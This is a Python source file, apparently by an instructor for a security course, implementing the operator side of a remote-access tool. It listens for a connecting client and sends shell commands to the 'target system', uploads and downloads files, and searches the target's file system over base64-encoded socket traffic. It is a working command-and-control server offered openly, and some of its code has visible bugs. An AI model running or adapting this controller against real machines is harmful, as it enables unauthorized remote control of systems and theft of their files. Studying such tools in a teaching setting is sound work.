# NAME: Robert Hendrickson
# ID:   instructor05
# DATE: 10-07-2021

import base64
import os
import socket
import sys
import time


def screen_wipe():
    if sys.platform.startswith('win'):
        os.system('cls')
    elif sys.platform.startswith('linux'):
        os.system('clear')


def mysendall(socket, data, delimiter):
    E_data = base64.b64encode(data) + delimiter
    return socket.sendall(E_data)


def myrecvall(socket, delimiter):
    data = b''
    while not data.endswith(delimiter):
        data += socket.recv(4096)
    D_data = base64.b64decode(data[:-len(delimiter)])
    return D_data


def upload(socket, delimiter):
    while True:
        print("[-] Please provide the absolute path for the server file")
        filename = input("[-] What is the server file?> ")
        try:
            with open(filename, 'rb') as f:
                data = f.read() 
        except Exception as e:
            E_msg = '[-] ERROR:\nTried to open {}\nReceived Error: {}\n'.format(filename, str(e))
            print(E_msg)
            continue 
        else: 
            path = '[-] Please provide the absolute path of the client destination'
            print(path)
            target_loc = input("[-] What is the client destination?> ").encode()
            mysendall(socket, target_loc, delimiter)
            print(myrecvall(socket, delimiter).decode())
            mysendall(socket, data, delimiter)
            print(myrecvall(socket, delimiter).decode())
            data = '\n[-] Next\n'.encode()
            mysendall(socket, data, delimiter)
            break
    c_response = myrecvall(socket, delimiter).decode()
    if '[!] ERROR' in c_response:
        e_msg = "{}[-]{} ERROR:{}\n".format(c_response)
        print(e_msg)
    else:
        print(c_response)
   

def searcher(socket, delimiter):
    print(myrecvall(socket, delimiter).decode())
    file_loc = input("[-] Where should we start looking?> ").encode()
    mysendall(socket, file_loc, delimiter)
    print(myrecvall(socket, delimiter).decode())
    data = input('[-] Do you know the file name?> ').encode()
    mysendall(socket, data, delimiter)
    known = myrecvall(socket, delimiter).decode()
    print(known)
    if 'y' in known:
        data = input('[-] What is the file name?> ').encode()
        mysendall(socket, data, delimiter)
    else:
        data = '[-] Unknown'.encode()
        mysendall(socket, data, delimiter)
    print("[-] Searching for file...")
    length = myrecvall(socket, delimiter).decode()
    if length.startswith('[!] ERROR') or length.startswith('[!] No'):
        print(length)
        data = '[-] Next'.encode()
        mysendall(socket, data, delimiter)
        print(myrecvall(socket, delimiter).decode())
    else:
        length = int(length)
        data = '[-] Ready'.encode()
        mysendall(socket, data, delimiter)
        results = []
        for i in range(length):
            match = myrecvall(socket, delimiter).decode()
            file_name, file_hash = match.split('--')
            print('[!] Match: {}\n    --{}'.format(file_name, file_hash))
            results.append(match)
            data = '[-] Next'.encode()
            mysendall(socket, data, delimiter)
        print(myrecvall(socket, delimiter).decode())


def helper():
    print("""    
    Server commands are listed below 
    cl    - clear the screen
    cmd   - Send a shell command to the target system
    dc    - disconnect from the client and listen for new connections
    dl    - download(receive) a file from the target system
    h     - Display server commands
    hs    - display command history for the server
    qt/ex - stop execution of the script the program
    sh    - enter multiple commands on the client
    src   - search the target for specified files using regular expressions
    ul    - Upload(send) a file ot the target system
    """)


def download(socket, delimiter):
    print(myrecvall(socket, delimiter).decode())
    print('[-] Please provide the absolute path for the client file')
    data = input('[-] What is the client file?> ').encode()
    mysendall(socket, data, delimiter)
    recvd = myrecvall(socket, delimiter).decode()
    if recvd.startswith('[!] ERROR'):
        print(recvd)
    else:
        print('[-] Please provide the absolute path to the server destination')
        theFile = input("[-] What is the server destination?> ")
        with open(theFile, 'w') as outFile:
            outFile.write(recvd)
    print("[-] File successfully downloaded to: {}".format(theFile))
    data = '[-] Next'.encode()
    mysendall(socket, data, delimiter)
    print(myrecvall(socket, delimiter).decode())


def command(socket, data, delimiter):
    print(myrecvall(socket,delimiter).decode())  
    if data[:4] != b'bk':
        mysendall(socket, data, delimiter)  
        output = myrecvall(socket,delimiter).decode()  
        print(output)
        data = '[-] Next'.encode()
        mysendall(socket, data, delimiter)
        print(myrecvall(socket,delimiter).decode())  
    else:
        mysendall(socket, data, delimiter)  
        output = myrecvall(socket,delimiter).decode()  
        if output.startswith("[!] ERROR") or output.startswith('[!] No'):
            print(output+'\n')
        else:
            print('[-] Command output: ')
            print(output) 
        data = '[-] Next'.encode()
        mysendall(socket, data, delimiter)  
        print('\n'+myrecvall(socket,delimiter).decode()) 
        

def multi(socket, delimiter, addr):
    data = b''
    while data != b'bk':
        try:
            client_info = myrecvall(socket, delimiter).decode()
        except Exception as e:
            type_e = str(type(e)).split()[1].split(">")[0]
            print('[-] Multi Function Error: \n  --Error type: {}\n  --Error: {}'.format(type_e, e))
            data = b'back'            
        client_name, client_CWD = client_info.split(';')
        # We print the server commands
        print('[-] Enter shell command or type bk to go back')
        prompt = '[!] {0}@{1}: {2}> '.format(client_name, addr, client_CWD)
        data = input(prompt).encode()
        mysendall(socket, data, delimiter) 
        if data == b'bk':
            break
        else:
            command(socket, data, delimiter)
            continue


def main():
    srvr_cmds = """\n{}[-]{} Server commands are as follows, enter them as shown:
    cl  - clear
    cmd - command  
    dc  - disconnect
    dl  - download
    ul  - upload
    src - search
    h   - help
    hs  - history
    qt  - quit
    ex  - exit
"""
    ports = [8888, 7777, 6666, 5555]
    ip = '0.0.0.0'
    delimiter = b"!!@@##$$!!"
    screen_wipe()
    srvr = socket.socket()
    for port in ports:
        try:
            time.sleep(1)
            print("[-] Binding port: {}".format(port))  
            srvr.bind((ip, port))  
        except socket.error:
            continue
        else:
            break
    srvr.listen(2)
    try:
        while True:
            print("[-] Listening for connections on 0.0.0.0 ...")
            conn, addr = srvr.accept()
            ip_addr = addr[0]
            print("[-] Connection established with client at {} !".format(str(ip_addr)))
            data = b'start'
            cmd_list = []
            while data != b'qt' or data != b'ex':
                client_info = myrecvall(conn, delimiter).decode()
                client_name, client_CWD = client_info.split(';')
                print('[-] Enter server command or press ? for server command list')
                prompt = '[-] {0}@{1}: {2}> '.format(client_name, ip_addr, client_CWD)
                data = input(prompt).strip().encode()
                cmd_list.append(data)
                mysendall(conn, data, delimiter) 
                exlist = [b'qt', b'ex']
                if b'l!' in data:
                    if data == b'l!':
                        data = cmd_list[-1]
                        print(data)
                if data == b'dl':
                    download(conn, delimiter)
                    continue
                elif data == b'hs':
                    for cmd in cmd_list:
                        if cmd == b'hs':
                            pass
                        else:
                            print('    {0} {1}'.format(cmd_list.index(cmd), cmd))
                    continue
                elif data == b'dc':
                    print(myrecvall(conn, delimiter).decode())
                    conn.close()
                    time.sleep(1)
                    screen_wipe()
                    break
                elif data == b'ul':
                    upload(conn, delimiter)
                    continue
                elif data == b'src':
                    print(searcher(conn, delimiter))
                    continue
                elif data == b'cl':
                    screen_wipe()
                    continue
                elif data == b'?':
                    print(srvr_cmds)
                    continue
                elif data == b'cmd':
                    print(myrecvall(conn, delimiter).decode())
                    ask = input('[-] s - single or m - multiple:> ').strip()
                    mysendall(conn, ask.encode(), delimiter)
                    if ask.lower().startswith('s'):
                        print('[-] Enter os command or type bk to go back')
                        data = input('[-] What command:> ').strip().encode()
                        command(conn, data, delimiter)
                        continue
                    elif ask.lower().startswith('m'):
                        multi(conn, delimiter, ip_addr)
                        continue
                elif data == b'h':
                    helper()
                    continue 
                elif data in exlist:
                    print(myrecvall(conn, delimiter).decode())
                    time.sleep(1)
                    screen_wipe()
                    srvr.close()
                    print('\n[-] Good Day Sir, you win nothing nada zip!\n')
                    sys.exit()
    except KeyboardInterrupt:
        print("\n[-] Good Day Sir! I said good day!")  
        srvr.close()
        sys.exit()
    except Exception as e:
        type_e = str(type(e)).split()[1].split('>')[0]
        data = '[-] Main Function Error: \n  --ERROR TYPE: {} \n  --ERROR:{}'.format(type_e, str(e))
        print(data)
        srvr.close()
        sys.exit()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
       sys.exit()
